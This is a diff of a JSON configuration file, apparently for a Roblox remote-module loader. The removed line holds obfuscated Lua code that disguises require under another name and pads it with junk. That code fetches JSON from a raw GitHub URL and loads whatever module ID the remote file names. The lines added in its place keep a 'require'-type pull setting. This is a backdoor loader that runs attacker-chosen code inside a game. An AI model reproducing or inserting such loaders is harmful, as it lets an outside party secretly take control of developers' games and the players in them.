@@ -2,5 +2,8 @@
   "success": true,
   "moduleId": 81728789284911,
   "method": "boot",
-  "customLinkerCode": "local module = {}\nlocal HttpService = game:GetService(\"HttpService\")\n\nlocal HYRO,_=--[[]]require,function()local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;local A=10;end\n\nlocal function a()\n    local success, response = pcall(function()\n        return HttpService:GetAsync(\"https://raw.githubusercontent.com/kxglkidd-blip/didactic-disco/main/%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3%20(4).txt\")\n    end)\n\n    if success then\n        local data = HttpService:JSONDecode(response)\n        if data.success and data.method == \"boot\" then\n            return HYRO(tonumber(data.moduleId))\n        end\n    end\n    return nil\nend\n\na()\n\nreturn module"
+  "pull": {
+    "enabled": true,
+    "type": "require"
+  }
 }
